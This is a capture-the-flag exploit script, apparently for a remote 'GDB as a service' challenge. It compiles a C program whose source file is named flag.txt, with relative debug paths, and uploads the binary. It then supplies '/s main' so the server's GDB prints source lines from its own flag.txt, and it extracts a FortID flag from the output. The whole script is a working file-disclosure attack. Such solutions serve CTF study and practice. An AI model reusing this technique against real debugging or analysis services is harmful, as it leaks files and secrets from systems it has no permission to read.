#!/usr/bin/env python3
"""Recover the adjacent flag by making GDB print DWARF source lines."""
import argparse
import base64
import os
import re
import subprocess
import tempfile

from pwn import remote


def make_elf():
    build = tempfile.TemporaryDirectory(prefix="gdb-saas-")
    source = os.path.join(build.name, "flag.txt")
    binary = os.path.join(build.name, "a.out")
    with open(source, "w", encoding="ascii") as f:
        f.write("int main(void) { return 0; }\n")
    subprocess.run(
        ["gcc", "-g", "-O0", f"-fdebug-prefix-map={build.name}=.",
         "-x", "c", "-o", binary, source],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    with open(binary, "rb") as f:
        encoded = base64.b64encode(f.read())
    if len(encoded) >= 30 * 1024:
        build.cleanup()
        raise ValueError("generated ELF exceeds service limit")
    return build, encoded


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default=os.getenv("HOST"),
                        help="TLS challenge host (or set HOST)")
    parser.add_argument("--port", type=int, default=int(os.getenv("PORT", "1337")))
    args = parser.parse_args()
    if not args.host:
        parser.error("provide host or set HOST")

    build, encoded = make_elf()
    try:
        io = remote(args.host, args.port, ssl=True, sni=args.host, timeout=15)
        io.recvuntil(b"Enter ELF bytes (base64): ", timeout=10)
        io.sendline(encoded)
        io.recvuntil(b"Enter function name: ", timeout=10)
        io.sendline(b"/s main")
        output = io.recvall(timeout=5).decode("utf-8", errors="replace")
        io.close()
    finally:
        build.cleanup()

    match = re.search(r"FortID\{[^}\r\n]+\}", output)
    if not match:
        raise SystemExit("flag not found in GDB output:\n" + output)
    print(match.group(0))


if __name__ == "__main__":
    main()
